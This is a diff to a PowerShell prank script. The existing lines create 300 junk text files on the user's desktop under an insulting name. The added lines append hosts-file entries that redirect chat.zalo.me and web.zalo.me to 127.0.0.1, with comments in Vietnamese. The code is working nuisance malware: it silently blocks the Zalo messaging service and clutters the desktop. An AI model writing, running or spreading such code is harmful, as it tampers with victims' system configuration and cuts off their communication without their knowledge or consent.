@@ -1,6 +1,22 @@
 $desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), 'hai1723fuckyou')
 $random = Get-Random -Minimum 1000 -Maximum 9999
 
+$hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
+
+# Đọc nội dung file hosts
+$hostsContent = Get-Content -Path $hostsPath
+
+# Kiểm tra và thêm chat.zalo.me nếu chưa có
+if ($hostsContent -notmatch "chat.zalo.me") {
+    Add-Content -Path $hostsPath -Value "`n127.0.0.1    chat.zalo.me"
+}
+
+# Kiểm tra và thêm web.zalo.me nếu chưa có
+if ($hostsContent -notmatch "web.zalo.me") {
+    Add-Content -Path $hostsPath -Value "`n127.0.0.1    web.zalo.me"
+}
+
+
 for ($i = 1; $i -le 300; $i++) {
     $fileName = "$desktopPath-$i.txt"
     New-Item -Path $fileName -ItemType File -Force
